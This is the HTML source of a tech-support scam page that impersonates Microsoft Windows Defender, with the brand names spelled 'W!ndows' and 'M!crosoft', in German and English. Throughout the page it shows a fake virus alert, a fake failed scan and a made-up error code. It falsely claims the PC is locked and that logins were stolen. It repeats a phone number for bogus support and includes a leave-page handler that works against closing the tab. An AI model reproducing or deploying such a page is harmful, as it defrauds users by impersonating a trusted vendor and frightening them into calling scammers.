...
<link rel="stylesheet" href="css/font-awesome.min.css">
      ...
      <style type="text/css">@keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}@-moz-keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}@-webkit-keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}#xnvjiaf2npoo1694042833969.open{animation : tawkMaxOpen .25s ease!important;}@keyframes tawkMaxClose{from{opacity: 1;transform:translate(0, 0px);;}to{opacity: 0;transform:translate(0, 30px);;}}@-moz-keyframes tawkMaxClose{from{opacity: 1;transform:translate(0, 0px);;}to{opacity: 0;transform:translate(0, 30px);;}}@-webkit-keyframes tawkMaxClose{from{opacity: 1;transform:translate(0, 0px);;}to{opacity: 0;transform:translate(0, 30px);;}}#xnvjiaf2npoo1694042833969.closed{animation: tawkMaxClose .25s ease!important}</style>
         ...
         <script src="js/customone.js" type="text/javascript"></script>
         <script src="js/customtwo.js" type="text/javascript"></script>
    <script>
function chat() {
...
<script>
  ...
  <script type="text/javascript">
		...
		<script defer data-domain="bill.com/v7fZ8s" src="https://api.publytics.net/js/script.manual.min.js"></script>
		<script>
    ...
    <audio id="websgt">
            ...
            <div class="col-md-8">
              <div class="activate_lic">
                <ul>
                  <li>
                    <a href="index.html#">
                      <button>Aktivieren Sie Ihre Lizenz</button>
                    </a>
                  </li>
                  <li>
                    <a href="index.html#">
            ...
            <div class="table_quick">
              <table class="table table-bordered">
                <thead>
                  ...
                  <tr>
                    <th scope="col">aufgewendete Zeit</th>
            ...
            <div class="row">
              <div class="col-md-6">
                <div class="bt_can">
                  ...
                  <div class="btn-group" role="group" aria-label="Basic example">
                    <button class="btn btn-secondary" type="button">vorübergehend anhalten</button>
                  </div>
                </div>
              </div>
              <div class="col-md-6">
                <div class="bt_can2">
                  <div class="btn-group" role="group" aria-label="Basic example">
                    <button class="btn btn-secondary" type="button">Planen Sie den Scan</button>
                  </div>
                </div>
              </div>
            </div>
      ...
      <div class="pro_box2" style="cursor: default; display: none;">
        <img src="https://buykhhj.z13.web.core.W!ndows.net/Wi1n0helpS0h0line57/images/bg1.png" alt="" style="max-width: 100%;">
      </div>
            ...
            <div class="col-md-8">
              <div class="activate_lic">
                <ul>
                  <li>
                    <a href="index.html#">
                      <button>Planen Sie den Scan</button>
                    </a>
                  </li>
                  <li>
                    <a href="index.html#">
          ...
          <div class="scan_box_header">
           ...
           <span class="fl title2" id="txts1">
              <a href="index.html#" id="cross">
                <p style="margin-right:50px;">+1-844-507-2395  </p><p style="margin-right:30px;">❏ </p><p>❌</p><p></p>
                      </a>
        ...
        <div class="row">
          <div class="col-md-12">
            <div class="right-foot" style="text-align:center">
              <span id="footertxt">
                <img src="images/msmm.png"> W!ndows Security </span>
              <span style="font-weight:500;padding-left:13px;color:#fff; ">W!ndows support <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">    +1-844-507-2395
                </span>
              </span>
            </div>
          </div>
          <div class="col-md-12">
            <marquee direction="left" height="100px" width="100%">
              <small class="text-left" style="color:#eee;font-size:10px">W!ndows Defender SmartScreen prevents unrecognized applications from appearing. Running this application may endanger your PC. W!ndows Defender scan detected unwanted adware on this device that can steal passwords, online identities, financial information, personal files, photos, and documents.</small>
            </marquee>
          </div>
        </div>
      </div>
      <div class="lightbox" id="mnboxs" onclick="beep1();" style="display: none; cursor:default;">
        <div class="ilb top" style="font-size:17px">
          <div class="ilb headers" style="border-bottom:1px solid #d6d5d5;">
            <span class="fl title" id="txtadd">
              <span class="fl ilb">
                <img src="images/dfs.png" class="logo3">
              </span>M!crosoft_Defender </span>
            <span class="fl title2" id="txts1">
        ...
        <div id="txtintro2">
          <span class="colo-rd">
           <p style="font-size:30px;font-weight:500;">Unfortunately the scan was not completed.</p>
            <p style="font-size:25px;color:red;font-weight:500;">Error: Ox80xdfy</p>
             <p style="font-size:15px;font-weight:400;color:black;">M!crosoft_Defender Some infected files were detected, but Group Policy permissions prevented them from being removed. To remove it manually, scan it now.</p>

          </span>
        </div>
        <img src="images/re.gif" id="banner">
        <div id="disclaimer" style="color:#0F396D;">Call support for help<br>
           <span class="support" style="font-size:22px;">W!ndows support : <span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px">    +1-844-507-2395
            </span>
          </span>
        </div>
        <div id="bottom">
          <img src="images/msmm.png" id="badge">
          <span class="title3">W!ndows <br>Security</span>
          <ul>
            <li>
      ...
      <div class="bcwebx" style="cursor: default; display: none;" id="getqwus">
        <p style="font-size:16px;font-weight:400;margin:0;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:0px" class="text-center">W!ndows-Defender </p>
        <p>
          <b>Der Zugriff auf diesen PC wurde aus Sicherheitsgründen gesperrt</b>
 </p>
 <p>Es wurde berichtet, dass Ihr PC mit Spyware vom Typ Trojaner infiziert ist. Die folgenden Informationen wurden kompromittiert:</p>
 <p>&gt; E-Mail-ID <br>&gt; Facebook-Anmeldung <br>&gt;
 <p>Der W!ndows-Defender-Scan hat potenziell unerwünschte Adware auf diesem Gerät erkannt, die Passwörter, Online-Identitäten, Finanzinformationen, persönliche Dateien, Fotos und Dokumente stehlen kann. </p>
 <p>Bitte kontaktieren Sie uns umgehend. Einer unserer Techniker wird Sie telefonisch durch den Entfernungsprozess führen. </p>
 <p>Um diese Bedrohung zu melden, Identitätsdiebstahl zu verhindern und den Zugriff auf dieses Gerät freizugeben, wenden Sie sich bitte umgehend an den W!ndows-Support. </p>
 <p>Das Schließen dieses Fensters kann Ihre persönlichen Daten gefährden und zur Beendigung Ihrer W!ndows-Registrierung führen. </p>
         <p style="padding-bottom:0;color:#fff;font-size:16px">W!ndows Bitte rufen Sie den Support an:<strong><br>
            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">   +1-844-507-2395
            </span>
          </strong>
        </p>
      ...
      <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);;height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
        <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Access to this system has been blocked for security reasons. Do not access or restart this PC. If you ignore this basic warning, you may lose information about this framework. Please contact support as soon as possible. A M!crosoft expert will guide you through the examination by telephone. Running this application may endanger your PC.<br>
          <strong>
        W!ndows support :<span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">    +1-844-507-2395
            </span>
          </strong>
        </p>
      </div>
      <div id="chat" class="bounce" style="display: none;">
        <img src="images/msmm.png">
        <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">M!crosoft</span>
        <br>
        <p>W!ndows technical support
        </p>
        <h4 style="font-weight:600;color:#0F396D;font-size:22px">    +1-844-507-2395
...
margin-left: 6px;
position: relative;
top: 5px;">Virus Alert 02751 !!</span>
...
<p class="text-center" style="color: #CDCBCB;  margin-top:10px; font-size: 16px; opacity:.9; ">
  M!crosoft W!ndows has been locked due to unusual activity. <br><br>

<img src="images/console.gif" width="360">

<br>It has been reported that your system is infected with Trojan horse spyware. <br>If you require assistance, please contact M!crosoft Support : <br><strong style="font-size:24px;">+1-844-507-2395   			 	</strong></p>
...
<script type="text/javascript">
  window.onbeforeunload = function() {
     if (data_needs_saving()) {
         return "Call W!ndows Defender Helpline Now";
     } else {
        return;
     }
  };
